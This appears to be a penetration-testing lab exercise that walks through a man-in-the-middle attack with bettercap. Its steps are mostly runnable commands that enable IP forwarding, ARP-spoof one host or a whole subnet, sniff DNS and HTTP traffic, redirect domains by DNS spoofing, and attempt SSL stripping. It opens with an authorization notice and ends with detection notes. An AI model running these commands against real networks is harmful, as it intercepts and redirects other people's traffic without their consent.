# Exercise 03 — ARP Poisoning & MITM

> **Authorization reminder:** Only run this against devices you own or have
> explicit written authorization to test. On a company network this means
> IT management sign-off. Running this against unauthorized devices is illegal.

**Goal:** Perform a full MITM attack using ARP poisoning. Intercept and
read the traffic of an authorized target device.

**Tools:** bettercap, Wireshark

---

## Prerequisites

- bettercap installed (https://www.bettercap.org/installation/)
- IP forwarding enabled on your machine (see below)
- Target device IP confirmed from Exercise 01
- Admin/root on your machine

---

## Step 1 — Enable IP forwarding

**Windows (run cmd as Administrator):**
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters /v IPEnableRouter /t REG_DWORD /d 1 /f
```
Then open `services.msc` → find **Routing and Remote Access** → set to
Automatic → Start it.

**Linux:**
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
```

> If you skip this step: the target device loses internet — they'll notice.

---

## Step 2 — Start bettercap

**Windows (run as Administrator):**
```cmd
bettercap.exe -iface "Wi-Fi"
```

**Linux:**
```bash
sudo bettercap -iface wlan0
```

---

## Step 3 — Discover network

Inside bettercap console:

```
net.probe on
```

Wait 15 seconds, then:

```
net.show
```

Output looks like:
```
┌─────────────────┬───────────────────┬──────────────────┬──────────┐
│      IP         │        MAC        │     Hostname     │  Vendor  │
├─────────────────┼───────────────────┼──────────────────┼──────────┤
│ 192.168.1.1     │ a8:9c:ed:11:22:33 │ router           │ TP-Link  │
│ 192.168.1.55    │ 3c:06:30:aa:bb:cc │ CORP-PC-02       │ Dell     │
│ 192.168.1.77    │ b8:27:eb:dd:ee:ff │ rpi-camera-01    │ RPi Fnd. │
└─────────────────┴───────────────────┴──────────────────┴──────────┘
```

Identify your target IP.

---

## Step 4 — Set ARP poisoning target

```
# Poison a single device
set arp.spoof.targets 192.168.1.55

# OR poison all devices (full network MITM — noisy, use carefully)
set arp.spoof.targets 192.168.1.0/24

# Enable ARP spoofing
arp.spoof on
```

Confirm it's running:
```
arp.spoof on
```

---

## Step 5 — Capture traffic

```
net.sniff on
set net.sniff.verbose true
```

All traffic from the target now flows through your machine.

### To save to a pcap file (open later in Wireshark):
```
set net.sniff.output capture.pcap
net.sniff on
```

---

## Step 6 — Apply filters to see useful data

Still in bettercap, use output filters:

```
# DNS only — see every domain the target visits
set net.sniff.filter udp port 53

# HTTP only — full URLs and headers
set net.sniff.filter tcp port 80

# All traffic
set net.sniff.filter ""
```

Or open Wireshark in parallel → select interface → apply filter:
```
ip.addr == 192.168.1.55
```

---

## Step 7 — DNS hijacking (optional, advanced)

While poisoning is active you can redirect domains:

```
# Point example.com to your machine
set dns.spoof.domains example.com
set dns.spoof.address 192.168.1.YOUR_IP
dns.spoof on
```

Now when the target types `example.com` they reach your machine.
Combine with a simple Python HTTP server to serve a test page:

```bash
python -m http.server 80
```

Use case: phishing simulation (Scenario 01), testing DNS-based controls.

---

## Step 8 — SSL stripping (HTTPS downgrade attempt)

```
set https.proxy.sslstrip true
https.proxy on
```

This attempts to intercept the initial HTTP-to-HTTPS redirect and keep
the connection as HTTP so you can read it.

**Expected result on modern sites:** fails — HSTS prevents it.
**May work on:** old internal apps, devices that pre-date HSTS.

Document which internal resources are vulnerable to SSL stripping.

---

## Step 9 — Stop and clean up

```
arp.spoof off
dns.spoof off
https.proxy off
net.sniff off
exit
```

ARP caches on all devices will restore to correct values within ~2 minutes.

---

## What to document

After this exercise, write up:

| Item | Finding |
|------|---------|
| Target device | IP + hostname |
| DNS queries captured | List of domains visited |
| HTTP traffic found | Any unencrypted apps/sites? |
| SSL strip result | Did any HTTPS downgrade? |
| DNS hijack result | Did redirect work? |
| Duration of test | Start → stop time |

---

## Blue team implications

Everything you just did is detectable:
- The target's ARP cache was modified
- Wireshark on the target would show its gateway MAC changed
- A proper IDS (Snort, Suricata) with ARP rules fires an alert

Your Exercise 04 (`arp_monitor.cpp`) detects exactly this attack running
against your network.
